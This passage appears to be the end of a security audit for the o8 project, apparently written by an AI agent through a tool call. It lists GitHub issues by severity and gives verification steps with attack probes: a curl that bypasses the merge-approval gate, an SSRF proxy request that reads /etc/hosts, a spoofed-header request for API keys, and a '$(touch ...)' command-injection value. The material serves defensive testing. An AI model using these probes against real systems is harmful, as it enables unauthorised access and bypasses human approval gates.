| [#1318](https://github.com/hurttlocker/o8/issues/1318) | high | HIGH-4 worker flag / packet ownership |
| [#1319](https://github.com/hurttlocker/o8/issues/1319) | high | HIGH-5 webview socket no auth token |
| [#1320](https://github.com/hurttlocker/o8/issues/1320) | high | HIGH-6 file-io/file-content arbitrary R/W |
| [#1321](https://github.com/hurttlocker/o8/issues/1321) | high | HIGH-7 scratch-chat no approval gate |
| [#1322](https://github.com/hurttlocker/o8/issues/1322) | medium | MED-1 off-mac all-zeros master key |
| [#1323](https://github.com/hurttlocker/o8/issues/1323) | medium | MED-2 fail-open prefix gate instances |
| [#1324](https://github.com/hurttlocker/o8/issues/1324) | medium | MED-3 worker-branch git arg-injection |

Each body = root cause · exploit · affected `file:line` · fix · verification. Verification steps per finding:

- **CRIT-1:** from a non-operator loopback shell, raise a merge card then `curl -X POST …/api/panel/approvals -d '{"action":"approve","id":…}'`; assert the merge lands with a merge-gate violation present (should be blocked).
- **CRIT-2:** add a repo `.md` with the `<iframe srcdoc>` payload; open it in FileViewer; assert no cross-origin `fetch`/`dev-server` call fires (add a CSP + DOMPurify test).
- **CRIT-3:** `curl 'http://127.0.0.1:PORT/api/browser/proxy?url=<enc>http://localhost:PORT/api/panel/file-content?workspace=/%26path=etc/hosts'`; assert 400/403, not file contents.
- **HIGH-1:** `curl -H 'sec-fetch-site: none' http://<lan-ip>:PORT/api/v2/keys`; assert 401.
- **HIGH-2:** `search_code({query:"$(touch /tmp/o8-probe)"})`; assert `/tmp/o8-probe` is NOT created.
- **HIGH-3..7, MED-1..3:** per-finding repro in §3; add the corresponding vitest case to `tests/middleware-gate.test.ts` for every new gated prefix.
</content>
</invoke>
